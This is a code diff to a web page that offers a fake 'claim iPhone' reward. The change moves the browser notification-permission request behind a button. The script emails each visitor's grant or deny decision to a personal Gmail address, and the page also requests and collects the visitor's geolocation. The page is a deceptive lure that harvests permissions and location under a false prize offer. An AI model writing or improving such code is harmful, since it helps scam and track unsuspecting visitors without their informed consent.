@@ -19,6 +19,7 @@
         <form id="rewardForm">
             <!-- Your form fields here -->
             <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
+            <button type="button" id="permissionButton" class="btn btn-secondary btn-block">Enable Notifications</button>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
     </div>
@@ -34,16 +35,22 @@
             const locationDisplay = document.getElementById("locationDisplay");
             let latitude, longitude;
 
-            // Request Notification Permission
-            if ("Notification" in window) {
-                Notification.requestPermission().then(permission => {
-                    if (permission === "granted") {
-                        sendEmail("Notification Permission Granted", "The user has granted notification permissions.", "khalilrodeni@gmail.com");
-                    } else {
-                        sendEmail("Notification Permission Denied", "The user has denied notification permissions.", "khalilrodeni@gmail.com");
-                    }
-                });
-            }
+            // Request Notification Permission on Button Click
+            document.getElementById("permissionButton").addEventListener("click", function () {
+                if ("Notification" in window) {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === "granted") {
+                            sendEmail("Notification Permission Granted", "The user has granted notification permissions.", "khalilrodeni@gmail.com");
+                            alert("Notifications enabled!");
+                        } else {
+                            sendEmail("Notification Permission Denied", "The user has denied notification permissions.", "khalilrodeni@gmail.com");
+                            alert("Notifications disabled.");
+                        }
+                    });
+                } else {
+                    alert("Notifications are not supported by your browser.");
+                }
+            });
 
             // Geolocation permission and location display
             if ("geolocation" in navigator) {
